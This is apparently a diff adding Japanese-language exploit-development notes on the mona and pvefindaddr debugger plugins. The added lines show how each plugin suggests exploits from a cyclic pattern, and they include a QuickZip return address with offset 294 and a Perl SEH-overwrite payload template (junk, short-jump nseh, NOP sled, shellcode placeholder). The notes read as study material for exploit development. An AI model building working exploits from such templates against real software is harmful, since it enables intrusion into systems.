@@ -3158,6 +3158,29 @@ https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
    2:	58                   	pop    eax  ; [3] call時にスタックに保存したcall 0x2の次のアドレスをeaxに代入
    3:	ff d0                	call   eax  ; [4] call 0x2の次の命令に復帰。EAXにはその命令のアドレスがあり目標達成
    5:	e8 f8 ff ff ff       	call   0x2　; [2] 2:の処理(pop eax)にjmp。命令自体はcall $-0x3
+!mona suggest
+  pattcで作成した文字列をメモリに入れておくと、自動でよさそうなオフセットを計算してくれる
+  Exploitの候補はRubyで作成される
+            {
+              'Ret'     =>  0x0040db2c, # pop eax # pop ebx # ret  - QuickZip.exe
+              'Offset'  =>  294
+            }
+```
+##### pvefindaddr
+```txt
+!pvefindaddr suggest
+  pattcで作成した文字列をメモリに入れておくと、自動でよさそうなオフセットを計算してくれる
+  Exploitの候補はPerlで作成される
+ [+] Type of exploit : SEH (SE Handler is overwritten)
+     Offset to next SEH : 294
+     Offset to SE Handler : 298
+ [+] Payload suggestion (perl) :
+     my $junk="\x41" x 294;
+     my $nseh="\xeb\x06\x90\x90";
+     my $seh= XXXXXXXX;  #pop pop ret - use !pvefindaddr p -n    to find a suitable address
+     my $nops="\x90" x 24;
+     my $shellcode="<your shellcode here>";
+     my $payload = $junk.$nseh.$seh.$nops.$shellcode;
 
 ```
 #### PE-fileformat
